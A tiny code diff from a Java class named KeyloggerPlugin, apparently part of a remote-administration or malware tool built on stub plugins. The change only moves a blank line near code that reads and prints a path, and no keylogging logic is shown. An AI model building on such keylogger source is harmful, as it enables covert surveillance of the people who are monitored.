@@ -88,8 +88,8 @@ public class KeyloggerPlugin extends StubPlugin {
 			}
 		} else if (header == LOG_HEADER) {
 			String path = dis.readUTF();
-			
 			System.out.println(path);
+			
 		}
 	}
 
